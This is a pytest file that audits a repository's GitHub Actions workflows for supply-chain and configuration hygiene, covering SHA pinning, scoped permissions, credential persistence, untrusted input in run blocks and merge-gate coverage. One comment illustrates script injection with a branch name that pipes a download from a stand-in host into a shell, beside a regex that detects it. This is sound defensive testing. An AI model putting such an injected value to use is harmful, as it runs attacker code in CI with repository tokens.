# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at https://mozilla.org/MPL/2.0/.

"""The CI configuration is code, and nothing was checking it.

Everything else in this suite tests the program. This file tests the thing that
runs the tests, because the failure modes there are quiet ones: a job added and
left out of the required check is invisible to branch protection, an action
pinned to a moving tag silently changes what runs, an artifact path that drifts
from the script writing to it uploads nothing and warns instead of failing.

None of that shows up as a red build. It shows up as a green build that stopped
meaning anything, which is worse -- so these are the checks that need a test
rather than a convention.

Every assertion here is offline and reads only files in this repository.
"""

from __future__ import annotations

import re
import subprocess
from pathlib import Path

import pytest
import yaml

REPO = Path(__file__).resolve().parent.parent
WORKFLOWS = REPO / ".github" / "workflows"
SCRIPTS = REPO / ".github" / "scripts"

WORKFLOW_FILES = sorted(WORKFLOWS.glob("*.yml")) + sorted(WORKFLOWS.glob("*.yaml"))


def load(path: Path) -> dict:
    """Parse a workflow.

    `on:` is the one trap here: YAML 1.1 reads a bare `on` key as the boolean
    True, so the trigger block comes back under True rather than "on". Callers
    that want triggers should use triggers() below.
    """
    return yaml.safe_load(path.read_text())


def triggers(doc: dict) -> dict:
    return doc.get("on") or doc.get(True) or {}


def jobs(doc: dict) -> dict:
    return doc.get("jobs") or {}


def steps_of(job: dict) -> list[dict]:
    return [step for step in (job.get("steps") or []) if isinstance(step, dict)]


def test_there_are_workflows_to_check():
    """Guards every parametrised test below: an empty glob passes vacuously."""
    assert WORKFLOW_FILES, "no workflow files found -- the rest of this file proves nothing"


# --- supply chain -----------------------------------------------------------

# owner/repo[/subdir]@<40 hex> followed by a version comment. The comment is not
# decoration: the SHA alone tells a reviewer nothing about what version they are
# looking at, and dependabot uses it to know what to bump from.
PINNED = re.compile(
    r"uses:\s*(?P<action>[A-Za-z0-9._-]+/[A-Za-z0-9._/-]+)@(?P<ref>\S+)(?P<rest>.*)$"
)
SHA = re.compile(r"^[0-9a-f]{40}$")
VERSION_COMMENT = re.compile(r"^\s*#\s*v\d+\.\d+(\.\d+)?\s*$")


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
def test_every_action_is_pinned_to_a_sha_with_a_version_comment(path):
    """A tag is a pointer, and pointers move.

    `@v4` re-resolves on every run, so the code executing in CI -- with a token
    in the environment -- can change without a commit here. A 40-hex SHA cannot.
    """
    for number, line in enumerate(path.read_text().splitlines(), start=1):
        match = PINNED.search(line)
        if not match:
            continue
        where = f"{path.name}:{number}"
        ref = match["ref"]
        assert SHA.match(ref), f"{where}: {match['action']} is pinned to {ref!r}, not a commit SHA"
        assert VERSION_COMMENT.match(match["rest"]), (
            f"{where}: {match['action']} has no `# vX.Y.Z` comment after the SHA"
        )


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
def test_no_workflow_uses_pull_request_target(path):
    """The one trigger that runs a fork's code against a writable token.

    There is no use for it here, and it is the single most common way a public
    repository is compromised through Actions.
    """
    assert "pull_request_target" not in triggers(load(path))


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
def test_every_workflow_declares_top_level_permissions(path):
    """Absent means "whatever the repository default is", which is not a decision."""
    doc = load(path)
    assert doc.get("permissions") is not None, f"{path.name} has no top-level permissions block"


# The single write this repository's CI is allowed to do, and where.
ALLOWED_WRITES = {("codeql.yml", "analyze", "security-events")}


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
def test_no_job_grants_a_write_that_is_not_on_the_list(path):
    doc = load(path)
    scopes = [("", doc.get("permissions"))]
    scopes += [(name, job.get("permissions")) for name, job in jobs(doc).items()]
    for job_name, perms in scopes:
        if not isinstance(perms, dict):
            continue
        for scope, level in perms.items():
            if level == "read" or level == "none":
                continue
            assert (path.name, job_name, scope) in ALLOWED_WRITES, (
                f"{path.name}: job {job_name!r} grants {scope}: {level}. "
                "If that is intended, add it to ALLOWED_WRITES with a reason."
            )


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
def test_every_checkout_refuses_to_persist_credentials(path):
    """checkout leaves the token in .git/config unless told not to.

    Every later step then runs with push access to this repository sitting in a
    file, which for a workflow that only ever reads is a gift nobody asked for.
    """
    for job_name, job in jobs(load(path)).items():
        for step in steps_of(job):
            if not str(step.get("uses", "")).startswith("actions/checkout@"):
                continue
            with_ = step.get("with") or {}
            assert with_.get("persist-credentials") is False, (
                f"{path.name}: checkout in job {job_name!r} does not set persist-credentials: false"
            )


# Contexts an outsider can write. Interpolating one straight into a shell body
# runs it: a branch named `$(curl evil.sh|sh)` is a valid branch name.
UNTRUSTED = re.compile(
    r"\$\{\{\s*(github\.event\.|github\.head_ref|github\.ref_name)",
)


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
def test_no_run_block_interpolates_untrusted_input(path):
    for job_name, job in jobs(load(path)).items():
        for step in steps_of(job):
            body = step.get("run")
            if not isinstance(body, str):
                continue
            found = UNTRUSTED.search(body)
            assert not found, (
                f"{path.name}: job {job_name!r} interpolates {found.group(0)!r} into a "
                "run: block. Pass it through env: instead, where it is a value and not code."
            )


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
def test_every_job_has_a_timeout(path):
    """A hung job holds a runner for six hours by default and tells no one."""
    for job_name, job in jobs(load(path)).items():
        assert job.get("timeout-minutes"), f"{path.name}: job {job_name!r} has no timeout-minutes"


# --- the required check actually covers everything --------------------------

CI = WORKFLOWS / "ci.yml"
GATE = "all-green"

# Jobs deliberately outside the merge gate, each with the reason it is allowed
# to be. `upstreams` talks to the live internet, so a dead NOAA host must never
# be able to fail somebody's pull request.
UNGATED = {"upstreams"}


def test_the_required_check_needs_every_other_job():
    """The check that rots.

    Branch protection points at one job. Add a tenth job, forget to add it to
    that job's `needs`, and it runs, fails, and merges anyway -- with a green
    tick on the pull request, because the thing branch protection watches never
    heard about it.
    """
    doc = load(CI)
    all_jobs = set(jobs(doc))
    assert GATE in all_jobs, f"{GATE} is gone -- update this test and branch protection together"
    needs = set(jobs(doc)[GATE]["needs"])
    missing = all_jobs - needs - {GATE} - UNGATED
    assert not missing, (
        f"jobs {sorted(missing)} are not in {GATE}'s needs, so branch protection "
        "cannot see them. Add them, or add them to UNGATED here with a reason."
    )
    assert needs <= all_jobs, f"{GATE} needs jobs that do not exist: {sorted(needs - all_jobs)}"


def test_every_ungated_job_really_is_schedule_only():
    """UNGATED is an escape hatch, so check the escape is real.

    A job listed there but running on pull requests would be exempt from the
    merge gate *and* running on every PR -- the worst of both.
    """
    for name in UNGATED:
        condition = jobs(load(CI))[name].get("if", "")
        assert "schedule" in condition and "workflow_dispatch" in condition, (
            f"job {name!r} is exempt from {GATE} but is not gated to schedule/dispatch: "
            f"if: {condition!r}"
        )


def gate_rejects(payload: str) -> bool:
    """Run the gate's own grep, rather than a Python translation of it.

    A reimplementation would test the reimplementation. The pattern is read out
    of the workflow and handed to the same tool the runner uses, so what passes
    here is what passes there.
    """
    # S603/S607: a fixed argv, and the only input is this repository's own
    # workflow file. Naming grep by path would be less portable, not safer.
    found = subprocess.run(  # noqa: S603
        ["grep", "-qE", the_gate_pattern()],  # noqa: S607
        input=payload,
        text=True,
        check=False,
    )
    return found.returncode == 0


@pytest.mark.parametrize("payload", ['{"a": {"result": "failure"}}', '{"a":{"result":"failure"}}'])
def test_the_gate_notices_a_failure_however_github_spaces_it(payload):
    """The gate greps JSON, so it depends on formatting nobody here controls.

    Run the real pattern from the real workflow against both spellings rather
    than trusting that toJSON keeps rendering it the way it does today.
    """
    assert gate_rejects(payload), f"the gate would not notice a failure in {payload}"


def the_gate_pattern() -> str:
    """The grep pattern out of the gate's run: block, so the test cannot drift from it."""
    doc = load(CI)
    for step in steps_of(jobs(doc)[GATE]):
        match = re.search(r"grep -qE '([^']+)'", step.get("run") or "")
        if match:
            return match.group(1)
    pytest.fail(f"no grep pattern found in {GATE} -- this test no longer checks anything")


def test_the_gate_passes_when_everything_succeeded():
    """The other half: a pattern that matches everything would also 'notice' failures."""
    payload = '{"lint": {"result": "success"}, "test": {"result": "success"}}'
    assert not gate_rejects(payload), "the gate fails a run where every job succeeded"


# --- CI scripts and the workflow agree --------------------------------------


def workflow_text() -> str:
    return "\n".join(path.read_text() for path in WORKFLOW_FILES)


@pytest.mark.parametrize("script", sorted(SCRIPTS.glob("*.py")), ids=lambda p: p.name)
def test_every_ci_script_is_actually_run(script):
    """An unreferenced script under .github/scripts is dead weight that still lints."""
    assert f".github/scripts/{script.name}" in workflow_text(), (
        f"{script.name} is not invoked by any workflow"
    )


def test_the_screenshot_artifact_path_matches_where_the_script_writes():
    """Two files, one directory, and no error if they disagree.

    upload-artifact is configured `if-no-files-found: warn`, so a drift here
    uploads an empty artifact and the job still passes. This is the only thing
    that would notice.
    """
    render = (SCRIPTS / "render_check.py").read_text()
    default = re.search(r'gettempdir\(\)\)?\s*/\s*"([^"]+)"', render)
    assert default, "render_check.py no longer has a default screenshot directory"
    directory = default.group(1)

    for job in jobs(load(CI)).values():
        for step in steps_of(job):
            if not str(step.get("uses", "")).startswith("actions/upload-artifact@"):
                continue
            path = str((step.get("with") or {}).get("path", ""))
            if "png" not in path:
                continue
            assert directory in path, (
                f"upload-artifact reads {path!r} but render_check.py writes to "
                f"{directory!r} -- the screenshots would silently not be uploaded"
            )
            return
    pytest.fail("no screenshot upload step found")


def test_no_ci_script_binds_a_fixed_port():
    """Fixed ports are fine on a fresh runner and a nuisance on a real machine.

    A collector left over from an interrupted run holds the port, and the next
    attempt fails looking like a broken test rather than a busy socket.
    """
    for script in sorted(SCRIPTS.glob("*.py")):
        body = script.read_text()
        assert "free_port()" in body or "port" not in body.lower(), (
            f"{script.name} uses a port without free_port()"
        )
        literal = re.search(r"^\s*\w*PORT\w*\s*=\s*(\d{4,5})\b", body, re.MULTILINE)
        assert not literal, f"{script.name} hardcodes port {literal.group(1)}"


def test_make_lint_runs_ruff_over_the_same_paths_as_ci():
    """STATUS.md claims ``make check`` reproduces CI, so the scopes must match.

    CI lints ``src/ tests/ .github/scripts/`` and nothing else -- deliberately,
    because ``docs/`` contains python fences that are prose, laid out to be read
    rather than to satisfy a formatter. A bare ``ruff format .`` therefore
    rewrites documentation that CI would never have complained about, and the
    diff looks like the formatter demanded it. Either the Makefile and the
    workflow agree, or "run make check before pushing" is bad advice.
    """
    makefile = (REPO / "Makefile").read_text(encoding="utf-8")
    workflow = CI.read_text(encoding="utf-8")

    def scopes(text: str) -> set[frozenset[str]]:
        """Path arguments of every ruff invocation, one frozenset per command.

        The Makefile spells the tool ``$(RUFF)`` and the workflow spells it
        ``ruff``, so match either and take the trailing directory arguments.
        """
        found = set()
        for line in text.splitlines():
            if not re.search(r"(?:\$\(RUFF\)|\bruff\b)\s+(?:check|format)\b", line):
                continue
            paths = [word for word in line.split() if word.endswith("/")]
            if paths:
                found.add(frozenset(paths))
        return found

    from_make = scopes(makefile)
    from_ci = scopes(workflow)
    assert from_make, "no ruff invocation with explicit paths found in the Makefile"
    assert from_ci, "no ruff invocation with explicit paths found in the CI workflow"
    assert from_make == from_ci, (
        f"make lints {sorted(map(sorted, from_make))}, CI lints {sorted(map(sorted, from_ci))}"
    )


def test_the_documented_job_count_matches_the_workflow():
    """This number was wrong in both directions inside one day.

    STATUS.md said "Nine jobs", which was right. It was then "corrected" to Ten
    on a grep that counted the `push:` and `schedule:` keys under `on:` as
    jobs, and that correction shipped. A hand-counted number in prose is worth
    exactly as much as the counting method behind it, so count it here instead.

    CodeQL lives in its own workflow and is named separately rather than folded
    into the total, because "how many jobs does CI run" and "how many jobs does
    ci.yml define" are different questions and conflating them is what caused
    the error.
    """
    words = {8: "Eight", 9: "Nine", 10: "Ten", 11: "Eleven", 12: "Twelve"}
    total = len(jobs(load(CI)))
    status = (REPO / "docs" / "STATUS.md").read_text(encoding="utf-8")
    readme = (REPO / "README.md").read_text(encoding="utf-8")

    assert f"{words[total]} jobs" in status, (
        f"ci.yml defines {total} jobs; STATUS.md does not say {words[total]}"
    )
    assert f"{total} jobs" in readme, f"ci.yml defines {total} jobs; README.md disagrees"
